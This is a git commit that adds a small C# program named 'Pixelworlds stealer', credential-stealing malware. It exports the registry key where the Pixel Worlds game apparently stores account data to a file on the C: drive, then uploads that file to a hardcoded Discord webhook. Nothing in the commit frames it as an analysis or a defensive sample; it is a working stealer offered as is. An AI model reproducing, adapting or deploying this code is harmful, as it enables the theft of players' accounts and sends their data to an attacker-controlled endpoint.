09334a9c12b1ca3144d69a13b93c369e274ba124
Defiant <95227984+DefiantSkid@users.noreply.github.com>
2022-01-06 16:13:14 +0200

    Add files via upload

---
+++ Pixelworlds stealer/Program.cs
@@ -0,0 +1,14 @@
+﻿
+using System.Net;
+using System.Net.Http;
+using System.Net.Http.Headers;
+using Pixelworlds_stealer;
+
+
+reg.ExportKey("HKEY_CURRENT_USER\\SOFTWARE\\Kukouri", "C:\\account.reg");
+
+
+using (WebClient client = new WebClient())
+{
+    client.UploadFile("https://discord.com/api/webhooks/928647457326370896/DWdjrz5g9GCJ9QV_Yq_T4wTfyLsK76lksoG77M8DTx8uV35DQ9ggWRj8XhU2DDXXbxex", "C:/account.reg");
+}
---
+++ Pixelworlds stealer/reg.cs
@@ -0,0 +1,33 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Diagnostics;
+
+namespace Pixelworlds_stealer
+{
+    internal class reg
+    {
+        public static void ExportKey(string RegKey, string SavePath)
+        {
+            string path = "\"" + SavePath + "\"";
+            string key = "\"" + RegKey + "\"";
+
+            var proc = new Process();
+            try
+            {
+                proc.StartInfo.FileName = "regedit.exe";
+                proc.StartInfo.UseShellExecute = false;
+                proc = Process.Start("regedit.exe", "/e " + path + " " + key + "");
+
+                if (proc != null) proc.WaitForExit();
+            }
+            finally
+            {
+                if (proc != null) proc.Dispose();
+            }
+
+        }
+    }
+}
